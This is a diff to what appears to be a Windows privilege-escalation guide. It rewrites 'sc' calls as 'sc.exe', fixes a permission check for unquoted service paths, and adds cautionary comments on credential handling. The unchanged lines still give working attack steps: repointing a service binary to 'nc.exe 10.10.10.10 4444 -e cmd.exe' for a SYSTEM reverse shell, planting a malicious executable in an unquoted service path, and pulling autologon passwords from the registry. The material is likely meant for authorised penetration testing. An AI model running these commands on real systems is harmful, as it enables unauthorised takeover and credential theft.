@@ -59,12 +59,12 @@ accesschk.exe -uwcqv "Authenticated Users" * /accepteula
 # Result: RW MyService SERVICE_ALL_ACCESS
 
 # Check current config
-sc qc MyService
+sc.exe qc MyService
 
 # Stop service and change binary path
-sc stop MyService
-sc config MyService binpath= "C:\Users\Public\nc.exe 10.10.10.10 4444 -e cmd.exe"
-sc start MyService
+sc.exe stop MyService
+sc.exe config MyService binpath= "C:\Users\Public\nc.exe 10.10.10.10 4444 -e cmd.exe"
+sc.exe start MyService
 
 # Catch shell as SYSTEM
 ```
@@ -103,16 +103,17 @@ JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\users\public\nc
 wmic service get name,pathname | findstr /i /v """
 # Result: C:\Program Files\Vuln App\service.exe
 
-# Check write permissions
-icacls "C:\Program Files\Vuln App"
+# Check the ACTUAL executable candidate parent; write access to the final app folder
+# does not imply write access to C:\Program Files. Confirm service identity/restart rights too.
+icacls "C:\Program Files"
 # Result: Users:(W)
 
 # Place malicious binary
 copy C:\Users\Public\shell.exe "C:\Program Files\Vuln.exe"
 
 # Restart service
-sc stop "Vuln App"
-sc start "Vuln App"
+sc.exe stop "Vuln App"
+sc.exe start "Vuln App"
 ```
 
 ### Example 5: Credential Harvesting from Registry
@@ -122,9 +123,9 @@ reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
 # DefaultUserName: Administrator
 # DefaultPassword: P@ssw0rd123
 
-# Use credentials
+# Credential use requires its own confirmed scope; prefer interactive password entry.
 runas /user:Administrator cmd.exe
-# Or for remote: psexec \\target -u Administrator -p P@ssw0rd123 cmd
+# Never place a discovered password in argv, transcripts or the report.
 ```
 
 ## When to Use
